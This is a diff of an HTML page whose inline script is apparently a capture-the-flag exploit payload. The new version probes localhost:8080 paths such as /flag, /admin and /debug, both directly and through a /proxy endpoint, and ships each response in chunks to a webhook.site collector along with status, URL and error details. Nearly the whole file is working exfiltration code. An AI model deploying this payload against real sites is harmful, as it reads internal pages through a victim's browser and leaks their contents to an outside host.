@@ -1,41 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>a</title>
+<title>a</title>
 </head>
 <body>
 <script>
-const target = "https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/postcard-from-nyc";
-const target2 = "http://localhost:8080/proxy?url=https://localhost:8080/postcard-from-nyc";
+
 const webhook = "https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site";
 
-function sendHTML(html) {
+const paths = [
+"/postcard-from-nyc",
+"/flag",
+"/",
+"/admin",
+"/debug",
+"/save",
+"/view",
+"/api",
+"/api/flag",
+"/api/debug"
+];
 
-  // gửi len như bạn đang làm
-  fetch(webhook + "/len?l=" + html.length);
+function sendHTML(tag, html){
 
-  // gửi html theo chunk để tránh URL quá dài
+  fetch(webhook + "/len?src=" + tag + "&l=" + html.length);
+
   const chunk = 400;
 
-  for (let i = 0; i < html.length; i += chunk) {
-    const part = html.slice(i, i + chunk);
-    fetch(webhook + "/html?i=" + i + "&d=" + encodeURIComponent(part));
+  for(let i=0;i<html.length;i+=chunk){
+    const part = html.slice(i,i+chunk);
+    fetch(webhook + "/html?src=" + tag + "&i=" + i + "&d=" + encodeURIComponent(part));
   }
+
 }
 
-fetch(target)
-  .then(r => r.text())
-  .then(html => sendHTML(html))
-  .catch(e => {
-    fetch(webhook + "/err?e=" + encodeURIComponent(e.toString()));
+function debug(tag, r){
+  fetch(webhook + "/status?src=" + tag + "&s=" + r.status);
+  fetch(webhook + "/type?src=" + tag + "&t=" + r.type);
+  fetch(webhook + "/url?src=" + tag + "&u=" + encodeURIComponent(r.url));
+}
+
+paths.forEach(p=>{
+
+  const url = "http://localhost:8080" + p;
+
+  const proxy =
+  "http://localhost:8080/proxy?url=" +
+  encodeURIComponent(url);
+
+  fetch(proxy)
+  .then(async r=>{
+
+    debug("proxy"+p,r);
+
+    const html = await r.text();
+    sendHTML("proxy"+p,html);
+
+  })
+  .catch(e=>{
+    fetch(webhook + "/err?src=proxy"+p+"&e=" + encodeURIComponent(e));
   });
 
-fetch(target2)
-  .then(r => r.text())
-  .then(html => sendHTML(html))
-  .catch(e => {
-    fetch(webhook + "/err?e=" + encodeURIComponent(e.toString()));
+
+  fetch(url)
+  .then(async r=>{
+
+    debug("direct"+p,r);
+
+    const html = await r.text();
+    sendHTML("direct"+p,html);
+
+  })
+  .catch(e=>{
+    fetch(webhook + "/err?src=direct"+p+"&e=" + encodeURIComponent(e));
   });
+
+});
+
 
 </script>
 </body>
